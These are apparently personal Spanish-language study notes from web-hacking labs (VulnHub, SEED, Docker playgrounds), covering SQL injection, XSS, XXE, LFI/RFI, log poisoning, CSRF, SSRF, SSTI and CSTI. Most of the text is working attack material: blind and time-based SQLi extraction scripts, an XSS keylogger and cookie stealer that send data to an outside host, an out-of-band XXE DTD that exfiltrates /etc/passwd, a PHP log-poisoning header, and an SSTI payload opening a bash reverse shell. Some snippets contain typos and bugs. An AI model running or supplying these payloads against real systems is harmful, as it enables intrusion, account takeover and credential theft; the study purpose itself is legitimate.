# 1. [[SQLI]]

query desde php a la db para mostrar el nombre del usuario por su id(no sanitizada)
		
```php
	<?php
  $server = "localhost";
  $username = "luka";
  $password = "123456";
  $database = "basededatos";

  $conn = new msqli($server, $username, $password, $database);

  $id = $_GET['id'];

  $data = mysqli_query($conn, "select username from users where id = '$id'");
  $response = mysqli_fetch_array($data);

  echo $response["username"];
?>
```

usando la clausula **ORDER BY *3*** se puede averiguar el nro de columnas en la tabla
-- - para comentar el resto de la query

ejemplo inyeccion booleana:
	
```sql
	select(select substring(username,1,1) from user where id='1')='a'
```
	
pero esta query podria dar problemas por las comillas, entonces se recomienda usar ASCII
```sql
	select(select ascii(substring(username,1,1)) from user where id='1')=97;
```

comando curl con parametro de url data
	```bash
curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlenconde "id=2 or '1'='1'"
	```
	
```python
	#!/usr/bin/python3

import requests
import signal
import sys
import time
import string

from pwn import *

def def_handler(sig, frame):
    print("\n\n [!] exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# global_vars

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():
    p1 = log.progress("brute force")
    p1.status("inicializing brute force")
    
    time.sleep(1)

    p2 = log.progress("extracted data")

    extracted_info = ""
            
    for position in range(1,50):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring(select group_concat(username, 0x3a, password) from users),%d,1)) from user where id='1')=%d)" % (position, character);
            r = requests.get(sqli_url)
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
    sys.exit(0)


if __name__ == "__main__":
    makeSQLI()
```
**`characters`**: Una lista de todos los caracteres imprimibles que se usarán para comparar con los datos de la base de datos.
##### Lógica Principal: El ataque de Fuerza Bruta

La función `makeSQLI()` es el corazón del script. Utiliza dos bucles anidados para extraer la información.
El script intenta "adivinar" el contenido de la tabla `users` mediante esta estructura de URL: `?id=9 or (select(select ascii(substring(..., posicion, 1)) ...)=caracter)`
##### Los Bucles:
1. **Bucle Externo (`for position in range(1,50)`)**: Itera sobre cada posición de la cadena de texto que queremos extraer (del primer carácter al 50).
2. **Bucle Interno (`for character in range(33, 126)`)**: Prueba los valores ASCII del 33 al 126 (letras, números y símbolos).
##### La Condición Booleana:
- El script envía una petición GET.
- **Si la condición es verdadera**: El servidor responde con un código `200 OK`, lo que significa que el carácter probado es el correcto.
- **Acción**: El script guarda ese carácter en `extracted_info`, lo imprime en pantalla y pasa a la siguiente posición (`break`).


```python
#!/usr/bin/python3

import requests
import signal
import sys
import time
import string

from pwn import *

def def_handler(sig, frame):
    print("\n\n [!] exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# global_vars

main_url = "http://localhost/searchUsers.php"
characters = string.printable
sleep_time = 0.35


def makeSQLI():
    p1 = log.progress("brute force")
    p1.status("inicializing brute force")
    
    time.sleep(1)

    p2 = log.progress("extracted data")

    extracted_info = ""
            
    for position in range(1,50):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=72, sleep(sleep_time),1)" % (position, character);


            p1.status(sqli_url)

            time_start = time.time()

            r = requests.get(sqli_url)

            time_end = time.time()

            if time_end - time_start >sleep_time:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
    sys.exit(0)


if __name__ == "__main__":
    makeSQLI()
```
- **`time.time()`**: El script toma una marca de tiempo antes y después de la petición HTTP.
- **`if(condition, sleep, 1)`**: Esta es la función condicional de SQL. Si la condición se cumple, se ejecuta el `sleep`.
- **`time_end - time_start > sleep_time`**: Si la respuesta tardó más que el tiempo de espera configurado, el script confirma que el carácter es correcto.

# 2. [[XSS]] (cross-side scripting)
Permite a un atacante inyectar codigo JS, PHP o similar

codigo malicioso JS tipo stored/reflected:
```js
<script>
var email = "elpepe@gmail.com";
fetch("http://192.168.50.2/?=email + email");
</script>
```


codigo malicioso JS keylogger:
```javascript
<script>
var k = "";

document.onkeypress = function(e){
	e = e || window.event;
	k+= e.key;
	var i = new Image();
	i.src = "http://192.168.50.2/" + k;
}
</script>
```

redirect con JS
```javascript
<script>
window.location.href = "https://facebook.com"
</script>
```

robar cookie de sesion no tiene que tener httponly en este caso:
``` js
<script>
var request = new XMLHttpRequest();
request.open('GET,'http://192.168.50.2/?cookie=' + document.cookie);
request.send();
</script>
```

hacer cambios en la cuenta de otra persona robando el token csrf
```js
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");
var token = doc.getElementByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data = "title=hola%20estoy%20hackeado&_csrf_token=" + token;
req2.open("POST", "http://localhost:10007/newgossip", false);
req2.withCredentaials = true;
req2.setRequestHeder('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```
var domain = "http://localhost:10007/newgossip":
- Se define la URL del servidor al que se harán las peticiones.
- localhost indica que el servidor está en la misma máquina.
- El endpoint /newgossip parece aceptar formularios (GET y POST).

- Se crea un objeto `XMLHttpRequest`.
- Se abre una petición **GET síncrona** (`false` = bloquea el hilo).
- `withCredentials = true`:
    - Envía **cookies de sesión** (usuario autenticado).
- Se envía la petición al servidor.

- Guarda el HTML recibido como texto.
- Convierte ese HTML en un **documento DOM manipulable**.
- Permite buscar elementos como si fuera una página web real.

- Busca un elemento HTML con nombre `_csrf_token`.
- Extrae su valor.
 
 **El token CSRF**:
- Es un mecanismo de seguridad para evitar ataques CSRF.
- El servidor exige este token en peticiones POST válidas.

###### - **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)

tuve que usar NAT dentro de la config de virtualbox
hacer port forwarding desde el puerto 80 de la vm al 8080 del host
limpiar las iptables del host con iptables -F y iptables -P INPUT ACCEP
y luego ya pude conectarme desde la raspberry a la direccion `http://192.168.50.1:8080` / que es el `http://localhost:8080` desde el host

yo puedo crear un http server en el puerto 80
```python
python -m http.server 80
```
e inyecto el tag
```html
<script src="http://192.168.50.2:80/pwned.js"></script>
```

y ahora creo el archivo con el script

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.50.1/?cookie='+document.cookie);
request.send();
```
el codigo roba las cookies y las pone en la URL como parametro (solo el texto en la URL, no se envian datos en un payload)

```js
var request = new XMLHttpRequest();
request.send('GET', 'http://192.168.50.1/admin/admin.php?id=11&status=active');
request.send();
```
este codigo activa un usuario (que actualmente esta inactivo, con id=11) en la tabla de usuarios desde la cuenta autenticada admin a traves de XSS. Admin abre la ruta donde esta inyectado el script malicioso y se activa la cuenta que nosotros queremos

tambien se puede hacer un SQLi en esta maquina

cache busting (obliga a cargar la version nueva de un script)
`<script src="http://192.168.50.1/pwned.js?v=2"></script>`

# 3. [[XXE]] XML external entity injection
las entidades son como "strings" declaradas previamente que despues se pueden inyectar en el payload

ejemplo payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<root><name>luka</name><tel>123456</tel><email>&xxe;</email><password>12345678</password></root>POST /process.php HTTP/1.1

```

y recibo las contrasenas del servidor

![[Pasted image 20260117152120.png]]
##### XXE oob (out-of-band)
cuando no se puede ver la respuesta, se usan con external DTD 

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.50.1/malicious.dtd">`

malicious.dtd (debera estar en la misma carpeta en la que abra el puerto 80 con python http.server 80):
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.50.1/?file=%file;'>">
%eval;
%exfil;
```

![[Pasted image 20260117153757.png]]

para decodificarlo:
echo -n "cadena en base64" | base64 -d

![[Pasted image 20260117154138.png]]

> los XXE tambien sirven para explotar SSRF

# 4. [[LFI]] (local file inclusion)
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);
	include("/var/www/html". $filename)
?>
```
esto hace una sanitizacion al input del usuario
pero si pongo la cadena

"....//....//....//....//etc/passwd"
igualmente llego al mismo archivo
```php
<?php
	$filename = $_GET['filename'];
	$filename = str_replace("../", "", $filename);

	if(preg_match("/\etc\/passwd/", $filename)===1){
	echo "\n [!] pagina prohibida";
	}else{
	include("/var/www/html". $filename);
	}
?>
```
con ese codigo tambien se puede buscar el archivo passwd usando por ejemplo: "....//....//....//etc///././/passwd"

en php < 5.3 si hago un null byte injection (\0) al final de la cadena puedo lograr ver el contenido del archivo que quiero.
**null byte tambien se representa como:** %00

para controlar los ultimos 6 chars (en el caso de passwd)
```php
php -r 'if(substr(argv[1],-6,6)!="passwd") include(argv[1]);' '/etc/passwd'; echo
```
pero se puede ver archivos igualmente utilizando '/etc/passwd\\.'

wrapper de php por ejemplo -> php://filter/convert.base64-encode/resource=index.php. se debe poder ver el codigo fuente

Wrapper def:
son funciones que envuelven otras operaciones para controlarlas, y aunque son herramientas legítimas para funciones como la lectura de archivos o streams, se vuelven **vulnerabilidades críticas** cuando son mal configuradas o usadas por atacantes, permitiendo **[lectura de código fuente (LFI), ejecución remota de código (RCE)](https://www.google.com/search?client=firefox-b-d&q=lectura+de+c%C3%B3digo+fuente+%28LFI%29%2C+ejecuci%C3%B3n+remota+de+c%C3%B3digo+%28RCE%29&ved=2ahUKEwi6lLGi3peSAxWIRlUIHTWyH8oQgK4QegQIARAB), o eludir restricciones de acceso** para ver archivos sensibles del servidor, como `/etc/passwd` o archivos de configuración.

wrapper con los caracterese rotados 13 posiciones
?filename=php://filter/read=string.rot13/resource=secret.php

al convertir una cadena de base64 usando //filter/convert.iconv.UTF8.CSISO2022KR
y al volverla a decodear en base 64 lo que pasa es que se agrega un nuevo caracter al principio de la cadena principal, entonces la idea es agregar caracteres especificos para lograr formar un comando en la terminal

# 5. [[RFI]] (remote file inclusion)
con la vulnerabilidad del plugin de wordpress gwolle se puede inyectar codigo local mediante esta URL
```url
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```
para poder explotar la vulnerabilidad 'allow_url_include' = "yes" en la configuracion de php.ini 

> en /var/www/html es donde se ejecuta el codigo de la pagina de apache

# 6. [[log poisoning]] (LFI -> RFE)
se envenan los logs que estan en la carpeta /var/logs de la maquina que estoy atacando
con el siguiente comando se puede intercambiar el header User-Agent por un codigo malicioso de php
```bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"
```
# 7. cross-site request forgery ([[CSRF]])
en el **Lab Setup**: [https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)
en la peticion get de los usuarios si editamos la parte ?name="minombre" con nuestra cuenta propia se cambia en la pagina por que no hay validaciones adicionales

si en el campo de mensajes copio la peticion GET para cambiar el nombre de usuario. Cuando otra persona lo abra, se va a cambiar su nombre en su cuenta (al que elijamos en la peticion http).
se inyecta poniendo esto en el campo de mensaje con html
```html
<img src="http://www.seed-server.com/[la ruta de la peticion]" alt="image" width="1" height="1"/>
```

# 8. server-side request forgery([[SSRF]])
con lsof -i:80 se verifican los puertos abiertos especificos
hay que cambiar la configuracion en **/etc/php/8.1/apache2/php.ini** para cambiar la configuracion del servidor apache con "allow_url_include"

buscar archivo sin locate:
```bash
root@1bb631cbf6e8:~# find / -name php.ini 2>/dev/null
```
en /var/www/html creo el archivo utility.php
```php
<?php
	if(isset($_GET["url"])){
		$url = 	$_GET["url"];
		echo "\n [+] listing website content" . $url . "\n\n";
		include($url);
	}else{
		echo "\n [!] is necessary to insert a valid url query"
	}	
?>
```

analizo que puertos hay abiertos en esta direccion URL:
```bash
wfuzz -c -t 200 -z range,1-65535 "http://127.17.0.2/utility.php?url=http://127.17.0.1:FUZZ"
```
se podria acceder al proceso de un puerto que no 
deberia ser accedible

tambien se podria hacer dirigiendome a la direccion IP de un dispositivo que este en la misma subred que al que estoy atacando directamente para acceder a tu puerto
![[Pasted image 20260124061536.png]]
creando la red con docker para simular esta situacion
[[docker intro]]
```bash
docker network create --driver=bridge --subnet=10.10.0.0/24
docker network ps # listara las redes de docker
docker network connect network1 miContenedor
```
este ultimo comando va a crear una nueva interfaz en el contendor
```bash
curl "http://127.17.0.2/utility.php?url=http://10.10.0.3:7878"
```
# 9. server-side template injection ([[SSTI]])
docker run -p 8089:8089 -d filiparc/ssti-fask-hacking-playground

como esta corriendo flask por detras (python) puedo probar si el input esta sanitizado con: 
{{ 7 * 7 }}
![[Pasted image 20260124071323.png]]
me deja inyectar:
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/192.168.50.2/443.0>%261"').read() }}
```
%26=& en url encoding 
partes del comando:

1. `bash -c "..."`
`-c` le dice a Bash:
> “Ejecutá el comando que viene como string”

Es decir:
- El Bash externo solo sirve para **interpretar el texto**
- El comando real está dentro de las comillas

2. `bash -i`
Dentro del string se ejecuta otro Bash:
- `bash` → inicia una nueva shell
- `-i` → **modo interactivo**

Modo interactivo significa:
- Lee comandos desde `stdin`
- Muestra prompts
- Permite ejecución continua de órdenes
 
 3. `/dev/tcp/192.168.50.2/443`
En Bash, `/dev/tcp/host/puerto` es un **pseudo-dispositivo** que:
- Abre una **conexión TCP**
- Funciona como si fuera un archivo
- Permite leer y escribir datos por red

No es un archivo real, es una **feature interna de Bash**.
 
4. Redirecciones (`>`, `0>`, `&`)
El comando usa **redirecciones de file descriptors**.
Primero, limpiemos los escapes:
- `%26` representa `&` (HTML encoding)
- `%261` representa `&1`

El comando real, sin encoding, es conceptualmente:

`bash -i >& /dev/tcp/192.168.50.2/443 0>&1`

5. Qué hace cada redirección
###### `>& /dev/tcp/192.168.50.2/443`
- Redirige **stdout (1)** y **stderr (2)**
- Ambos se envían a la conexión TCP
Todo lo que Bash imprime sale por la red.
 
 `0>&1`
- Redirige **stdin (0)**
- Para que lea desde el mismo canal que stdout
Resultado:
- Entrada y salida usan la **misma conexión**`


entonces con nc -nlvp 443 me puedo conectar a la bash del servidor
# 10. client-side template injection ([[CSTI]])

en algunas versiones de angular se puede inyectar en campos input scripts como el siguiente para (por ejemplo) mostrar una alerta:
```js
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.mdi

# 11. [[padding oracle]]